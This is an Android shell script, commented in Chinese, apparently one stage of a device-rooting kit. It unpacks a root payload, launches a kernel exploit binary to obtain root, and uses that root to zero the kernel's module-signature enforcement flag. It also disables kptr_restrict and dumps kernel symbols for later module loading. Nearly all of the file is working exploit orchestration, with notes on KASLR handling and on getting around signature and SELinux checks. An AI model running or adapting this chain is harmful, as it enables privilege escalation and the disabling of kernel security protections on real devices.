#!/system/bin/sh
# Stage A：解包 Root 载荷 -> 取临时 root -> 导出本次开机的 kallsyms。
# 输出 key=value 行，供 PC 端解析。
cd /data/local/tmp || { echo "err=cd"; exit 1; }

ZERO=${1:-0xffffffc0830c7708}
TAG=$(date +%H%M%S 2>/dev/null || echo manual)
LOG=/data/local/tmp/glk-kit-$TAG.log
KS=/data/local/tmp/ks-kit-$TAG.txt
rm -f "$LOG" "$KS"

# magic5-root.so 是单文件载荷，自解包出 glk-bin / glk-helper-bin / su / su-perm。
# 用 --unpack-only 而不是默认模式，是为了显式指定 profile_175.bin —— 内嵌的那份
# 是早期版本，prepare_max_attempts=4，成功率很低。解包用 rename 覆盖，能绕开
# permissive 窗口里旧文件丢失 SELinux 标签导致 adb push 失败的问题。
./magic5-root.so --unpack-only >/dev/null 2>&1
if [ ! -x ./glk-bin ] || [ ! -r ./profile_175.bin ]; then
    echo "err=unpack"
    exit 1
fi
chmod 755 ./glk-bin ./glk-helper-bin ./su ./su-perm 2>/dev/null

# GLK_ZERO_ADDR 是名义地址（KIMAGE_TEXT_BASE + 0x30c7708），exploit 内部自己
# 按本次 KASLR 换算；传真实地址会被 W1c 校验拒绝。它清的是模块验签开关
# sig_enforce —— 每次开机都复位成 Y，不清掉 insmod 会被 EKEYREJECTED 拒绝。
GLK_ZERO_ADDR=$ZERO GLK_ZERO_LEAF=0 \
    setsid /data/local/tmp/glk-bin \
        --load-prebuilt-profile /data/local/tmp/profile_175.bin >"$LOG" 2>&1 &

i=0
while [ $i -lt 45 ]; do
    sleep 2
    grep -qa "child is root" "$LOG" && break
    i=$((i + 1))
done

# helper 起来后 su socket 还要几秒才 ready，必须轮询，否则 kallsyms 会导出空文件。
U=""
i=0
while [ $i -lt 25 ]; do
    U=$(./su -c 'id -u' 2>/dev/null)
    [ "$U" = "0" ] && break
    sleep 2
    i=$((i + 1))
done

if [ "$U" = "0" ]; then
    ./su -c 'echo 0 > /proc/sys/kernel/kptr_restrict; cat /proc/kallsyms' >"$KS" 2>/dev/null
fi

echo "tag=$TAG"
echo "uid=$U"
echo "ks=$KS"
echo "ks_lines=$(wc -l <"$KS" 2>/dev/null | tr -d ' ')"
echo "sig=$(./su -c 'cat /sys/module/module/parameters/sig_enforce' 2>/dev/null)"
echo "text=$(grep -m1 ' _text$' "$KS" 2>/dev/null | cut -d' ' -f1)"
echo "log=$LOG"
